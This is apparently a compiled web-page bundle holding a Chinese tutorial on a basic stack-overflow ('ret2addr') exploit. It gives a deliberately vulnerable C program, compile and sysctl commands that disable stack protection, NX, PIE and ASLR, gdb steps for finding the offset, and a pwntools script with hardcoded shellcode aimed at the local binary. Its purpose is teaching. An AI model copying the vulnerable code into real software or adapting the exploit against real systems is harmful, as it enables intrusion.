(window.webpackJsonp=window.webpackJsonp||[]).push([[19],{358:function(t,a,s){"use strict";s.r(a);var n=s(9),e=Object(n.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("p",[t._v("最简单的 pwn 就是使用栈溢出返回到一个地址去执行shellcode，虽然见不到这种攻击方法，但是，对栈结构的理解还是很有帮助的。")]),t._v(" "),s("p",[t._v("ret2addr（return-to-address，"),s("strong",[t._v("返回到确定地址执行")]),t._v("的攻击方法）")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x8048000)\n")])])]),s("p",[t._v("没有栈不可执行（NX），也没有地址随机化（ASLR）。这时候就直接使用地址覆盖就好。")]),t._v(" "),s("h2",{attrs:{id:"_0-准备一下"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0-准备一下","aria-hidden":"true"}},[t._v("#")]),t._v(" 0. 准备一下")]),t._v(" "),s("p",[t._v("首先要创建一个文件，"),s("code",[t._v("vuln.c")])]),t._v(" "),s("div",{staticClass:"language-c extra-class"},[s("pre",{pre:!0,attrs:{class:"language-c"}},[s("code",[s("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("# "),s("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("func")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" buf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x50")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("read")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x100")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" buf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x100")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("func")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),s("p",[t._v("安装 32 位编译环境")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("apt-get")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("install")]),t._v(" gcc-multilib g++-multilib\n")])])]),s("p",[t._v("编译并关闭地址随机化")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 编译命令 ")]),t._v("\ngcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack  -no-pie\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 关闭地址随机化功能")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /proc/sys/kernel/randomize_va_space\n")])])]),s("h2",{attrs:{id:"_1-确定溢出位置"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-确定溢出位置","aria-hidden":"true"}},[t._v("#")]),t._v(" 1. 确定溢出位置")]),t._v(" "),s("ul",[s("li",[t._v("先在IDA里估计下缓存区大小，然后使用 "),s("code",[t._v("pattern create length")]),t._v("生成一段随机不重复的字符串。")]),t._v(" "),s("li",[t._v("然后在 gdb 中 r指令 运行程序，，由于栈溢出，导致原本的函数的返回地址无法执行。")]),t._v(" "),s("li",[t._v("使用 pattern offset addr 确定程序的返回地址，也就是应该输入的无效字符串的长度。")])]),t._v(" "),s("h2",{attrs:{id:"_2-确定返回地址"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-确定返回地址","aria-hidden":"true"}},[t._v("#")]),t._v(" 2. 确定返回地址")]),t._v(" "),s("ul",[s("li",[t._v("打开 core 转储功能 "),s("code",[t._v("ulimit -c unlimited")]),t._v("。")]),t._v(" "),s("li",[t._v("运行程序，输入 上面获得的长度的无效字符串 + 4个任意字符（ESP）+ 4个任意字符（EIP）。此时程序会报错，然后把信息转储至 core 文件。")]),t._v(" "),s("li",[t._v("用 "),s("code",[t._v("gdb 程序名称 core")]),t._v("打开 core 文件。")]),t._v(" "),s("li",[t._v("此时ESP指向了所希望的 shellcode 的位置，也就是我们的自定义代码的位置。")]),t._v(" "),s("li",[t._v("此时EIP应该填充为 shellcode 的地址，即此时ESP的值。")])]),t._v(" "),s("h2",{attrs:{id:"_3-编写利用脚本"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-编写利用脚本","aria-hidden":"true"}},[t._v("#")]),t._v(" 3. 编写利用脚本")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#context.log_level='debug'")]),t._v("\np"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("process"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"./vuln"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 此处是程序的路径")]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("92")]),t._v("\t"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 此处的92是第一步所确定的无效字符串的长度")]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v("p32"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xffffcf80")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#此处的地址是第二步时获得的 shellcode 地址")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#shellcode脚本")]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x32\\x80"')]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75"')]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff"')]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x32\\xc1\\x51\\x69\\x30\\x30\\x74\\x69"')]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x69\\x30\\x63\\x6a\\x6f\\x8a\\xe4\\x51"')]),t._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x54\\x8a\\xe2\\x9a\\xb1\\x0c\\xce\\x81"')]),t._v("\n\np"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("send"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\np"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#返回交互式界面")]),t._v("\n")])])]),s("h2",{attrs:{id:"_4-pwn"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-pwn","aria-hidden":"true"}},[t._v("#")]),t._v(" 4. pwn")]),t._v(" "),s("ul",[s("li",[t._v("执行"),s("code",[t._v("python vuln.py")]),t._v("（即第三步的脚本文件）")])])])}),[],!1,null,null,null);a.default=e.exports}}]);